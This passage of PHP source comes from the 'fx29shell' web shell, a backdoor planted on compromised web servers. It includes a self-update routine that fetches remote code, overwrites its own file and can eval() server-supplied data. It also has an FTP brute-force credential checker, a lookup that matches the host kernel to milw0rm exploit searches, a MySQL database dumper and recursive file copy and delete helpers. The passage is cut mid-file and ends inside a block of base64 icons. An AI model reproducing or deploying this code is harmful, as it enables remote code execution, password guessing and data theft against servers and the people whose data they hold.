##[ Fx29Sh UPDATE FUNCTIONS ]##

function fx29sh_getupdate($update = FALSE) {

  global $fx29sh_updateurl;

  $url = $fx29sh_updateurl."?version=".urlencode(base64_encode(sh_ver));

  $data = @file_get_contents($url);

  if (!$data) { return "<div class=errmsg>Can't connect to update-server! ($fx29sh_updateurl)</div>"; }

  else {

    $data = ltrim($data);

    if ($data{0} == "\x99" and $data{1} == "\x01") { return "You already using latest version!"; }

    if ($data{0} == "\x99" and $data{1} == "\x02") {

     $string = substr($data,3,ord($data{2}));

      $string = explode("|",$string);

      if ($update) {

        $confvars = array();

        $sourceurl = $string[0];

        $source = @file_get_contents($sourceurl);

        if (!$source) { return "Can't fetch update!"; }

        else {

          $fp = @fopen(__FILE__,"w");

          if (!$fp) { return "Local error: can't write update to ".__FILE__."! You may download fx29shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>."; }

          else {

            fwrite($fp,$source);

            fclose($fp);

            return "Update completed!";

          }

        }

      }

      else { return "New version is available: ".$string[1]; }

    }

    elseif ($data{0} == "\x99" and $data{1} == "\x03") { eval($string); return TRUE; }

    else { return "<div class=errmsg>Error in protocol: segmentation failed! (".$data.")</div>"; }

  }

}

##[ END Fx29Sh UPDATE FUNCTIONS ]##

function fx29_buff_prepare() {

  global $sess_data, $act;

  foreach ($sess_data["copy"] as $k=>$v) {

    $sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));

  }

  foreach ($sess_data["cut"] as $k=>$v) {

    $sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));

  }

  $sess_data["copy"] = array_unique($sess_data["copy"]);

  $sess_data["cut"]  = array_unique($sess_data["cut"]);

  sort($sess_data["copy"]);

  sort($sess_data["cut"]);

  if ($act != "copy") {

    foreach ($sess_data["cut"] as $k=>$v) {

      if ($sess_data["copy"][$k] == $v) { unset($sess_data["copy"][$k]); }

    }

  }

  else {

    foreach ($sess_data["copy"] as $k=>$v) {

      if ($sess_data["cut"][$k] == $v) { unset($sess_data["cut"][$k]); }

    }

  }

}

function fx29_sess_put($data) {

  global $sess_cookie;

  global $sess_data;

  fx29_buff_prepare();

  $sess_data = $data;

  $data = serialize($data);

  setcookie($sess_cookie,$data);

}

##[ FILESYSTEM FUNCTIONS ]##

function fs_copy_dir($d,$t) {

  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

  $h = opendir($d);

  while (($o = readdir($h)) !== FALSE) {

    if (($o != ".") and ($o != "..")) {

      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

      else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

      if (!$ret) {return $ret;}

    }

  }

  closedir($h);

  return TRUE;

}

function fs_copy_obj($d,$t) {

  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);

  if (!is_dir(dirname($t))) {mkdir(dirname($t));}

  if (is_dir($d)) {

    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}

    return fs_copy_dir($d,$t);

  }

  elseif (is_file($d)) { return copy($d,$t); }

  else { return FALSE; }

}

function fs_move_dir($d,$t) {

  $h = opendir($d);

  if (!is_dir($t)) {mkdir($t);}

  while (($o = readdir($h)) !== FALSE) {

    if (($o != ".") and ($o != "..")) {

      $ret = TRUE;

      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

      else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}

      if (!$ret) {return $ret;}

     }

   }

  closedir($h);

  return TRUE;

}

function fs_move_obj($d,$t) {

  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);

  if (is_dir($d)) {

    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}

    return fs_move_dir($d,$t);

  }

  elseif (is_file($d)) {

    if(copy($d,$t)) {return unlink($d);}

    else {unlink($t); return FALSE;}

  }

  else {return FALSE;}

}

function fs_rmdir($d) {

  $h = opendir($d);

  while (($o = readdir($h)) !== FALSE) {

    if (($o != ".") and ($o != "..")) {

      if (!is_dir($d.$o)) {unlink($d.$o);}

      else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}

    }

  }

  closedir($h);

  rmdir($d);

  return !is_dir($d);

}

function fs_rmobj($o) {

  $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);

  if (is_dir($o)) {

    if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}

    return fs_rmdir($o);

  }

  elseif (is_file($o)) {return unlink($o);}

  else {return FALSE;}

}

##[ END FILESYSTEM FUNCTIONS ]##

##[ FX29SH EXIT FUNCTIONS ]##

function fx29shexit() {

  global $gzipencode,$ft;

  if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {

    $v = @ob_get_contents();

    @ob_end_clean();

    @ob_start("ob_gzHandler");

    echo $v;

    @ob_end_flush();

  }

  exit;

}

##[ END OF FX29SH EXIT FUNCTIONS ]##

function fx29fsearch($d) {

  global $found, $found_d, $found_f, $search_i_f, $search_i_d, $a;

  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

  $h = opendir($d);

  while (($f = readdir($h)) !== FALSE) {

    if($f != "." && $f != "..") {

      $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));

      if (is_dir($d.$f)) {

        $search_i_d++;

        if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}

        if (!is_link($d.$f)) { fx29fsearch($d.$f); }

      }

      else {

        $search_i_f++;

        if ($bool) {

          if (!empty($a["text"])) {

            $r = @file_get_contents($d.$f);

            if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}

            if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}

            if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}

            else {$bool = strpos(" ".$r,$a["text"],1);}

            if ($a["text_not"]) {$bool = !$bool;}

            if ($bool) {$found[] = $d.$f; $found_f++;}

          }

          else {$found[] = $d.$f; $found_f++;}

        }

      }

    }

  }

  closedir($h);

}

function tabsort($a,$b) { global $v; return strnatcmp($a[$v], $b[$v]);}

function view_perms_color($o) {

  if (!is_readable($o)) { return "<font class=red>".view_perms(fileperms($o))."</font>"; }

  elseif (!is_writable($o)) { return "<font color=white>".view_perms(fileperms($o))."</font>"; }

  else { return "<font color=green>".view_perms(fileperms($o))."</font>"; }

}

function view_perms($mode) {

  if (($mode & 0xC000) === 0xC000) {$type = "s";}

  elseif (($mode & 0x4000) === 0x4000) {$type = "d";}

  elseif (($mode & 0xA000) === 0xA000) {$type = "l";}

  elseif (($mode & 0x8000) === 0x8000) {$type = "-";}

  elseif (($mode & 0x6000) === 0x6000) {$type = "b";}

  elseif (($mode & 0x2000) === 0x2000) {$type = "c";}

  elseif (($mode & 0x1000) === 0x1000) {$type = "p";}

  else {$type = "?";}

  $owner["read"] = ($mode & 00400)?"r":"-";

  $owner["write"] = ($mode & 00200)?"w":"-";

  $owner["execute"] = ($mode & 00100)?"x":"-";

  $group["read"] = ($mode & 00040)?"r":"-";

  $group["write"] = ($mode & 00020)?"w":"-";

  $group["execute"] = ($mode & 00010)?"x":"-";

  $world["read"] = ($mode & 00004)?"r":"-";

  $world["write"] = ($mode & 00002)? "w":"-";

  $world["execute"] = ($mode & 00001)?"x":"-";

  if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}

  if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}

  if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

  return $type.join("",$owner).join("",$group).join("",$world);

}

function parsesort($sort) {

  $one = intval($sort);

  $second = substr($sort,-1);

  if ($second != "d") {$second = "a";}

  return array($one,$second);

}

function parse_perms($mode) {

  if (($mode & 0xC000) === 0xC000) {$t = "s";}

  elseif (($mode & 0x4000) === 0x4000) {$t = "d";}

  elseif (($mode & 0xA000) === 0xA000) {$t = "l";}

  elseif (($mode & 0x8000) === 0x8000) {$t = "-";}

  elseif (($mode & 0x6000) === 0x6000) {$t = "b";}

  elseif (($mode & 0x2000) === 0x2000) {$t = "c";}

  elseif (($mode & 0x1000) === 0x1000) {$t = "p";}

  else {$t = "?";}

  $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;

  $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;

  $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;

  return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);

}

function str2mini($content,$len) {

  if (strlen($content) > $len) {

    $len = ceil($len/2) - 2;

    return substr($content, 0,$len)."...".substr($content,-$len);

  } else { return $content; }

}

function strips(&$arr,$k="") {

  if (is_array($arr)) { foreach($arr as $k=>$v) { if (strtoupper($k) != "GLOBALS") { strips($arr["$k"]); } } }

  else { $arr = stripslashes($arr); }

}

function getmicrotime() {

  list($usec, $sec) = explode(" ", microtime());

  return ((float)$usec + (float)$sec);

}

function milw0rm() {

  $Lversion = php_uname("r");

  $OSV = php_uname("s");

  if(eregi("Linux",$OSV)) {

    $Lversion = substr($Lversion,0,6);

    return "http://milw0rm.com/search.php?dong=Linux Kernel ".$Lversion;

  } else {

    $Lversion = substr($Lversion,0,3);

    return "http://milw0rm.com/search.php?dong=".$OSV." ".$Lversion;

  }

}

function fx29ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {

  if ($fqb_onlywithsh) { $TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin"))); }

  else { $TRUE = TRUE; }

  if ($TRUE) {

    $sock = @ftp_connect($host,$port,$timeout);

    if (@ftp_login($sock,$login,$pass)) {

      echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";

      @ob_flush();

      return TRUE;

    }

  }

}

if (!enabled("posix_getpwuid")) { function posix_getpwuid($uid) { return FALSE; } }

if (!enabled("posix_getgrgid")) { function posix_getgrgid($gid) { return FALSE; } }

if (!enabled("posix_kill")) { function posix_kill($gid) { return FALSE; } }

##[ MySQL FUNCTIONS ]##

function mysql_dump($set) {

  $sock = $set["sock"];

  $db = $set["db"];

  $print = $set["print"];

  $nl2br = $set["nl2br"];

  $file = $set["file"];

  $add_drop = $set["add_drop"];

  $tabs = $set["tabs"];

  $onlytabs = $set["onlytabs"];

  $ret = array();

  $ret["err"] = array();

  if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}

  if (empty($db)) {$db = "db";}

  if (empty($print)) {$print = 0;}

  if (empty($nl2br)) {$nl2br = 0;}

  if (empty($add_drop)) {$add_drop = TRUE;}

  if (empty($file)) {

    $file = $tmp_dir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";

  }

  if (!is_array($tabs)) {$tabs = array();}

  if (empty($add_drop)) {$add_drop = TRUE;}

  if (sizeof($tabs) == 0) {

    #Retrieve tables-list

    $res = mysql_query("SHOW TABLES FROM ".$db, $sock);

    if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}

  }

  $out = "

  # Dumped by ".sh_name()."

  # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."

  # Date: ".date("d.m.Y H:i:s")."

  # DB: \"".$db."\"

  #---------------------------------------------------------";

  $c = count($onlytabs);

  foreach($tabs as $tab) {

    if ((in_array($tab,$onlytabs)) or (!$c)) {

      if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}

      #Receieve query for create table structure

      $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);

      if (!$res) {$ret["err"][] = mysql_smarterror();}

      else {

        $row = mysql_fetch_row($res);

        $out .= $row["1"].";\n\n";

        #Receieve table variables

        $res = mysql_query("SELECT * FROM `$tab`", $sock);

        if (mysql_num_rows($res) > 0) {

          while ($row = mysql_fetch_assoc($res)) {

            $keys = implode("`, `", array_keys($row));

            $values = array_values($row);

            foreach($values as $k=>$v) {$values[$k] = addslashes($v);}

            $values = implode("', '", $values);

            $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";

            $out .= $sql;

          }

        }

      }

    }

  }

  $out .= "#---------------------------------------------------------------------------------\n\n";

  if ($file) {

    $fp = fopen($file, "w");

    if (!$fp) {$ret["err"][] = 2;}

    else {

      fwrite ($fp, $out);

      fclose ($fp);

    }

  }

  if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}

  return $out;

}

function mysql_buildwhere($array,$sep=" and",$functs=array()) {

  if (!is_array($array)) {$array = array();}

  $result = "";

  foreach($array as $k=>$v) {

    $value = "";

    if (!empty($functs[$k])) {$value .= $functs[$k]."(";}

    $value .= "'".addslashes($v)."'";

    if (!empty($functs[$k])) {$value .= ")";}

    $result .= "`".$k."` = ".$value.$sep;

  }

  $result = substr($result,0,strlen($result)-strlen($sep));

  return $result;

}

function mysql_fetch_all($query,$sock) {

  if ($sock) {$result = mysql_query($query,$sock);}

  else {$result = mysql_query($query);}

  $array = array();

  while ($row = mysql_fetch_array($result)) {$array[] = $row;}

  mysql_free_result($result);

  return $array;

}

function mysql_smarterror($sock) {

  if ($sock) { $error = mysql_error($sock); }

  else { $error = mysql_error(); }

  $error = htmlspecialchars($error);

  return $error;

}

function mysql_query_form() {

  global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;

  if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}

  if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}

  if ((!$submit) or ($sql_act)) {

    echo "<table><tr><td><form name=\"fx29sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";

    if ($tbl_struct) {

      echo "<td valign=\"top\"><b>Fields:</b><br>";

      foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.fx29sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}

      echo "</td></tr></table>";

    }

  }

  if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}

}

function mysql_create_db($db,$sock="") {

  $sql = "CREATE DATABASE `".addslashes($db)."`;";

  if ($sock) {return mysql_query($sql,$sock);}

  else {return mysql_query($sql);}

}

function mysql_query_parse($query) {

  $query = trim($query);

  $arr = explode (" ",$query);

  $types = array(

    "SELECT"=>array(3,1),

    "SHOW"=>array(2,1),

    "DELETE"=>array(1),

    "DROP"=>array(1)

  );

  $result = array();

  $op = strtoupper($arr[0]);

  if (is_array($types[$op])) {

    $result["propertions"] = $types[$op];

    $result["query"]  = $query;

    if ($types[$op] == 2) {

      foreach($arr as $k=>$v) {

        if (strtoupper($v) == "LIMIT") {

          $result["limit"] = $arr[$k+1];

          $result["limit"] = explode(",",$result["limit"]);

          if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}

          unset($arr[$k],$arr[$k+1]);

        }

      }

    }

  }

  else { return FALSE; }

}

##[ END OF MYSQL FUNCTIONS ]##



##[ IMAGES ]##

function imagez() {

  $images = array(

  "home"=>

'R0lGODlhEwAYALMJAH6+91OZ97zp/l6x/Y/V/iVr7DGQ/QwxyAEKpP///wAAAAAAAAAAAAAAAAAA'.

'AAAAACH5BAHoAwkALAAAAAATABgAAASoMEkJwrwYAyEqyFkQcFwFTuJAkF1xDkExAARdAy4W4EUw'.

'zwAALEfhFQy+5AAWmwwLUIN0OhPlBjLocSpdDgzYBLYnjXa/U1fMQD6auWzxMQBmn0XpBJ6OB6fs'.

'cXwiPl5LBwgIdGqDhV4FiImBKV5CQQGQPjlgS0GVMJBfRD5BBDU1l4g+BxcGNqYEAQeHBasYBqW4'.

'sLK1IAUcK7onFwWlOMIZB0THyxgRADs=',

  "buffer"=>

'R0lGODlhGAAWALMJABo+qGql77zK4OPw+pXE9Tx33mOCxx5WzYyv4v///wAAAAAAAAAAAAAAAAAA'.

'AAAAACH5BAHoAwkALAAAAAAYABYAAASbMMlJa0LFao0QMZslDMJFEEGhhtPgul4gFwebvK9BICnN'.

'4oPOACU7HAAb3Gl4mtGQltfSdSI+AdAWVVlNGbHZmxTYVB3BUOCI2vR+AQaQZL1lz74GhEAgn48I'.

'bCg0BwV7ewh9AgSGgEM9ASOGe32NiwFMAY0ukgZhU1WaOHxhE0tTQCR9GksIqHyqG4qnQbAsAkK0'.

'NhsFiLq+NhEAOw==',

  "search"=>

'R0lGODlhGAAXAKIEAHl5ecbGxqCgoOvr6////wAAAAAAAAAAACH5BAHoAwQALAAAAAAYABcAAANq'.

'SLq88iK02UIM1kY67fgDhj3c4oGiKJRK9mUpycFpHQClHbw8zl2iEOjlo9SEw1DRuNsliaygMwlY'.

'di7PgcDKUD2moW1utAVAHtUS9maGmLkOTBiudrJZk3Uaz4gQ6XUYe3wNb4CEiImKCQA7',

  "back"=>

'R0lGODlhGAAYALMJAC9ILkesPbHdo3W0Zi2IJ+f141aOUTRoM4LKdP///wAAAAAAAAAAAAAAAAAA'.

'AAAAACH5BAHoAwkALAAAAAAYABgAAASwMMlJq7046zSM/8YmeYNgFiZiHMdmCEVszoIaXscLpwhC'.

'dy2LASETlAoBXw8xCFYMqNQuWesBK4OjkVgYLL8B52h2LCCS2WxgECAAJiteLNarMtduOEE678/P'.

'bW8jBzVefigybIEUQz0BMF0EAZOTkm6CEgCNbFOUngR5FAdLazCAlKChomt3ASiolpiMB5OKbJZt'.

'oLIVtJ6VuaoXAAepxbq7GcTFAMgbzM/NItLTGxEAOw==',

  "forward"=>

'R0lGODlhGAAYAKIGAB9fHVu2T7nirIbKdjaXL+z36P///wAAACH5BAHoAwYALAAAAAAYABgAAAOc'.

'aLrc/g1ICSsZIosRSGWXUGjaQAAfIY7Z4GIc+qgFy734+Qxsy2+BV8dBGPVeI04wEJAtfiSgSMCs'.

'Og2AEu5Wo1Z1iuwGsymvChxCxynG1N7wWocAxmaCGVZcQKezYVVfPCNzJ1cBYzdMF4R9dWEwQkFy'.

'hY8KF5KIaI6WYUGKS5ydYReBapxXDgBqpn0UH2Grjq+wDBMTtbm6uwsJADs=',

  "up"=>

'R0lGODlhGAAXAKIGABxXG0irPrLeo3zFbzWFMOLz3v///wAAACH5BAHoAwYALAAAAAAYABcAAAOP'.

'aLrc/jBKMoa4lRCp6C1XOASbNBQgVq1D6XipsAYs+RCoAFZ5QNMEQIOSq+hQO59PyAjoMEckauQL'.

'MnBQaS5JYnZ2Tx6INu5ed5bRqUClmhcEEU3srlrhIZlsXSe8OxZ6K1NKJAFecIEshFV/CwBONRiN'.

'dy9zFYVKGohDlz92AJw3mSRBohGhqaEcrK2uDgkAOw==',

  "help"=>

'R0lGODlhGAAYAKIGADlqzKjA6O3x932d3rPk/12Byv///wAAACH5BAHoAwYALAAAAAAYABgAAAOa'.

'aLor7ixK8+qb0eqLN/mENVlfYJpDUEkPMaSh474xwbTvsA3AEN8CV6GgEhR6Dh5SEFA8BkeASgmQ'.

'Aa4/igMQvXoLjoBXJ3AGu95rMQ0ua8Vpb5HKhWgJ8SsZfbVb8ypwaWRmRoACdHp2Wol5aTINW3Ep'.

'fHtAgn1MbByRmnKIXw8FLE9fV0ScEkVhKSYrGAqrG02wEa6stbm6CQA7',



  "change"=>

'R0lGODlhEAAQALMMADMuME2f58e2ON7OMsXZ88wpTd/t/FhYU4x9erCwrIWSpW54iwAAAAAAAAAA'.

'AAAAACH5BAHoAwwALAAAAAAQABAAAARckMlJ6wQn6wMsW0QoBktXLUaaEkHAIYiJqiuhFAUg0yqR'.

'IAKdZMYzIAacCbGXEAyEQ0IvlEAeKCCDVJpompRbkUJzEokBi0XZTFgoCFfKwa1Q0NNxCmazz3v+'.

'DBEAOw==',

  "delete"=>

'R0lGODlhEAAQAKIGAJIMJNMHLckjQURDQ2oqNigoKAAAAAAAACH5BAHoAwYALAAAAAAQABAAAANP'.

'KDHW/k4JBiuRFI5pilBE8RQX12yBIHYfMGTeNxQoMVfbJ7gZ5AWpV8VBU6SGkVSpR7zwdISKURgz'.

'dS4B2yMXMgyAWo2OBGQ6cq+NmbhJAAA7',

  "download"=>

  "R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".

  "AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".

  "EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",

  "setup"=>

  "R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".

  "QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".

  "ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".

  "qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".

  "OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",

  "small_dir"=>

'R0lGODlhDwAQALMPAAkJCXV3iEFvz5it4MXV8lFkqXaU2au+6EtMViQkJYGGq2JjcUFhunN3ljc3'.

'OQAAACH5BAHoAw8ALAAAAAAPABAAAARuEKDVVEsv64wO+UfjOBO1AM2nHsbQGkaDDCo43EdOVPW9'.

'ErmFgjDI6YyHm7AINN5cMESgSH3CBAKGo9GCwgxYrHbx/YbDYwEYfEY7Fu149s2QZxkFRQJRR+Mb'.

'AQsOAA98DH8NggCEGgmAiowbGREAOw==',

  "small_unk"=>

'R0lGODlhEAAQAKIHABpFnoap3bTL89vq/FuCvVZlhH6Ms////yH5BAHoAwcALAAAAAAQABAAAANL'.

'eBfcrVCFQetgJS5bA/nRxFlGJlUFoBICZUDi6gGsYG5DWqntLZI8G4xDCApPHeMR5wL8lgbSE9rq'.

'OavUqurngTm+ntuhQC6byYcEADs=',

  "multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".

  "pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",

  "sort_asc"=>

  "R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".

  "SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",

  "sort_desc"=>

  "R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".

  "SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",

  "ext_asp"=>

  "R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".

  "/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".

  "D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",

  "ext_mp3"=>

'R0lGODlhEAARALMPADE8XE6ekMSuNMDW7M1IRGRoZOXs9Ki31Y2HW3PEiFl2u19RX4ajzNmCeuew'.

'pwAAACH5BAHoAw8ALAAAAAAQABEAAASI8D1Gqy0yM8O7GRSmeR2oKOJEcgN4oJJyNExSD197iAjS'.

'OI2EkIFrYQqN3+cgRBA/iwLhh+MwE4HDYLeYGg4MLTNQCBi7joECcKKQC9tCV7tmhwoALV5BPMnA'.

'PXk7BSc5LA4CCAUHXCcHHogChIwYbG2RkgVhOxKWCggCkgCafCkAp6inBaurEQA7',

  "ext_avi"=>

'R0lGODlhEAAQALMMAAUFBY2OkM7T2UpKSqWoq+zz/GhoaSQkJLW4u1paWnp6ejY3NwAAAAAAAAAA'.

'AAAAACH5BAHoAwwALAAAAAAQABAAAARdkMkpgVGH6poIwttkeQUBbqNQrGZGjYG6lobLWAoixHOw'.

'GByDbpUrAQ6K2+AoW/0OyOMy4GtioozBgsAaqBDa08AwoxHCgMmPRzSM05R17x2SBxKn+uUCD0nW'.

'fRoRADs=',

  "ext_cgi"=>

'R0lGODlhEAAQAKIHAEhJS+q8D/7dNfnulpR/U5pqCtS5eP///yH5BAHoAwcALAAAAAAQABAAAANT'.

'eLpX/K9ISItwlElBcG5BMEFSGYolVgzsYAih0Q5FF7IwjAcdcRCE021wKQB8CqCQRQAcH4SXYOck'.

'EQUy2DMSMmaBEWITSBAjFZLxAliDghlkRQIAOw==',

  "ext_cmd"=>

  "R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".

  "eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".

  "dmrYAMn1onq/YKpjvEgAADs=",

  "ext_cpp"=>

  "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".

  "WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".

  "Eq7YrLDE7a4SADs=",

  "ext_ini"=>

  "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".

  "aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".

  "SnEjgPVarHEHgrB43JvszsQEADs=",

  "ext_diz"=>

'R0lGODlhEAAQAKIHAAsZcWyPv7vT6eb0/ThOi1tukZyyy////yH5BAHoAwcALAAAAAAQABAAAANS'.

'eHrTLiu6IYh5chZAJlRTI4RDcIyacXkF6gAcWaxPLFJzaNhoZYyoXQcoCMwErgCHuFP8kEVjAGkg'.

'FBaqJ9CgvEYOBQK06/0qjlazuSBVr8uLBAA7',

  "ext_doc"=>

  "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".

  "WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".

  "MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",

  "ext_exe"=>

  "R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".

  "WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".

  "xhIAOw==",

  "ext_h"=>

  "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".

  "WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".

  "Wq/NknbbSgAAOw==",

  "ext_hpp"=>

  "R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".

  "WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".

  "UqUagnbLdZa+YFcCADs=",

  "ext_htaccess"=>

  "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".

